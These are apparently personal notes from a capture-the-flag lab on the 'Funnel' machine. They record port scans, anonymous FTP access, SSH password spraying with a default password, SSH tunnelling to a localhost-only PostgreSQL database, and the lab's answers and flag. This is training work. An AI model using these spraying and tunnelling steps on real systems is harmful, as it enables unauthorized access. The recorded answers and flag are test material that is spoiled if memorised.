@@ -1,0 +1,305 @@
+2024-11-12 10:06:14 CST -- START TIME
+### funnel ###
+--------------------------------------
+
+
+|================================================================
+- Name: funnel 
+- IP Address: 10.129.230.200 
+- OS: Ubuntu 20.04.5 LTS / 5.4.0-135-generic 
+- Notes: 
+
+//CREDS:
+	# ftp / <empty>
+	# ssh: christine/funnel123#!#
+
+//Flags: cf277664b1771217d7006acdea006db1
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// TASKS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#1 How many TCP ports are open? 
+	2
+#2 What is the name of the directory that is available on the FTP server?
+	mail_backup
+#3 What is the default account password that every new member on the "Funnel" team should change as soon as possible?
+	funnel123#!#
+#4 Which user has not changed their default password yet?
+	christine
+
+#5 Which service is running on TCP port 5432 and listens only on localhost?
+	postgresql	
+
+#6 Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?
+	local port forwarding
+
+#7 What is the name of the database that holds the flag?
+	secrets
+
+#8 Could you use a dynamic tunnel instead of local port forwarding? Yes or No.
+	yes
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2024-11-12 10:39:01 CST -- 
+// SCAN
+ip=10.129.230.200
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//21,22,754,21360,24519,27749,27900,31808,37968,60829
+
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE  SERVICE  VERSION
+21/tcp    open   ftp      vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.16.13
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+
+2024-11-12 10:45:03 CST -- 
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// FTP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+ftp -A 10.129.230.200 //User: ftp
+
+ftp> ls
+drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
+ftp> cd mail_backup
+ftp> ls
+-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
+-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
+
+ftp> get password_policy.pdf
+ftp> get welcome_28112022
+
+//Users
+optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
+
+//Default password
+	funnel123#!#
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+echo '10.129.230.200' funnel.htb | sudo tee -a /etc/hosts
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// crackmapexec ssh
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2024-11-12 11:19:30 CST -- 
+crackmapexec ssh funnel.htb -u 'users.lst' -p 'funnel123#!#'
+
+SSH         funnel.htb      22     funnel.htb       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+SSH         funnel.htb      22     funnel.htb       [-] optimus:funnel123#!# Authentication failed.
+SSH         funnel.htb      22     funnel.htb       [-] albert:funnel123#!# Authentication failed.
+SSH         funnel.htb      22     funnel.htb       [-] andreas:funnel123#!# Authentication failed.
+SSH         funnel.htb      22     funnel.htb       [+] christine:funnel123#!#
+
+
+//How to do it with hyrda
+#hydra -L users.lst -p 'funnel123#!#' funnel.htb ssh
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// SSH
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2024-11-12 11:27:34 CST -- 
+// connect SSH | christine:funnel123#!#
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" christine@funnel.htb
+
+//CONNECTED!!!
+
+
+// Survey
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+id
+uid=1000(christine) gid=1000(christine) groups=1000(christine)
+
+sudo -ll
+[sudo] password for christine: 
+Sorry, user christine may not run sudo on funnel.
+
+date
+Tue 12 Nov 2024 05:44:35 PM UTC
+
+uname -a
+Linux funnel 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+cat /etc/*elease | egrep -i "pretty"
+PRETTY_NAME="Ubuntu 20.04.5 LTS
+
+netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:44035         0.0.0.0:*               LISTEN     
+tcp        0      1 10.129.230.200:36518    1.1.1.1:53              SYN_SENT   
+tcp        0    208 10.129.230.200:22       10.10.16.13:53848       ESTABLISHED
+tcp6       0      0 :::21                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN
+
+netstat -at
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:postgresql    0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:44035         0.0.0.0:*               LISTEN     
+tcp        0      1 10.129.230.200:44196    8.8.8.8:domain          SYN_SENT   
+tcp        0    208 10.129.230.200:ssh      10.10.16.13:53848       ESTABLISHED
+tcp6       0      0 [::]:ftp                [::]:*                  LISTEN     
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2024-11-12 12:01:52 CST -- 
+//Build SSH tunnel to postgress port
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" christine@funnel.htb -L 1111:127.0.0.1:5432
+
+//Connected!
+
+//QUick PortScan
+sudo nmap -Pn -A -p1111 127.0.0.1
+
+PORT     STATE SERVICE    VERSION
+1111/tcp open  postgresql PostgreSQL DB 9.6.0 or later
+| fingerprint-strings: 
+|   Kerberos: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 27265.28208: server supports 3.0 to 3.0
+|     Fpostmaster.c
+|     L2188
+|     RProcessStartupPacket
+|   SMBProgNeg: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0
+|     Fpostmaster.c
+|     L2188
+|_    RProcessStartupPacket
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// postgreSQL
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2024-11-12 12:16:06 CST -- 
+psql -h 127.0.0.1 -p 1111 -U christine
+
+# \list
+                                                      List of databases
+   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |    Access privileges    
+-----------+-----------+----------+-----------------+------------+------------+--------+-----------+-------------------------
+ christine | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
+ postgres  | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
+ secrets   | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
+ template0 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/christine           +
+           |           |          |                 |            |            |        |           | christine=CTc/christine
+ template1 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/christine           +
+           |           |          |                 |            |            |        |           | christine=CTc/christine
+
+# \connect secrets
+psql (17.0 (Debian 17.0-1+b2), server 15.1 (Debian 15.1-1.pgdg110+1))
+You are now connected to database "secrets" as user "christine".
+
+# \du+
+                                    List of roles
+ Role name |                         Attributes                         | Description 
+-----------+------------------------------------------------------------+-------------
+ christine | Superuser, Create role, Create DB, Replication, Bypass RLS |
+
+# \dt
+         List of relations
+ Schema | Name | Type  |   Owner   
+--------+------+-------+-----------
+ public | flag | table | christine
+
+# SELECT * FROM flag;
+              value               
+----------------------------------
+ cf277664b1771217d7006acdea006db1
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//FLAG: cf277664b1771217d7006acdea006db1
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// BONUS: USE SSH SOCKS PROXY METHOD
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# Confirm Proxy settings and port (9050)
+
+# SSH in to start the proxy (-D)
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" christine@funnel.htb -D 9050
+
+#Log into the PostgreSQL server
+proxychains4 -q psql -U christine -h 127.0.0.1 -p 5432
+
+//SUCCESS!!!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2024-11-12 13:51:48 CST -- COMPLETE
+
